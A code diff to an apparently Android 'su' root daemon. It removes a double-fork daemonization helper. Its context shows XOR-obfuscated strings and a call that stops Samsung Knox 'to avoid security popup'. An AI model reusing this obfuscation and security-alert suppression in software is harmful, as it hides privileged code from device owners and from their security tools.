@@ -35,28 +35,6 @@ static unsigned char ld_library_path[] = "\x92\x6f\xf2\x22\x2a\x53\x22\x25\x50\x
 static unsigned char system_libs[] = "\x5a\xed\xa0\x8f\xf4\xc1\xcc\xc6\xcf\xf8\x8f\xce\xcd\xc8\xa0\x8f\xfb\xfd\xfb\xf6\xc1\xc9\x8f\xce\xcd\xc8"; // "/vendor/lib:/system/lib"
 static unsigned char rt[] = "\x04\x16\x10\x9a\x90";
 
-// Fork and give to the child the init context
-int fork_zero_fucks() {
-  int pid = fork();
-
-  // The parent wait for the child exit
-  if (pid) {
-    int status;
-    waitpid(pid, &status, 0);
-    return pid;
-  }
-
-  // The child fork again
-  else {
-    // The parent of the new child exit allowing his parent to continue
-    if (pid = fork())
-      exit(0);
-
-    // At this point the new child has the init as parent
-    return 0;
-  }
-}
-
 
 int main(int argc, char *argv[]) {
   char path[256];
@@ -104,10 +82,6 @@ int su_main(int argc, char *argv[], int need_client) {
 
     // start up in daemon mode if prompted
     if (argc == 2 && strcmp(argv[1], "--daemon") == 0) {
-
-      // Start the daemon as init child
-      //if(fork())
-      //return 0;
 
       // Stop knox to avoid security popup if exists
       if(is_knox_present())
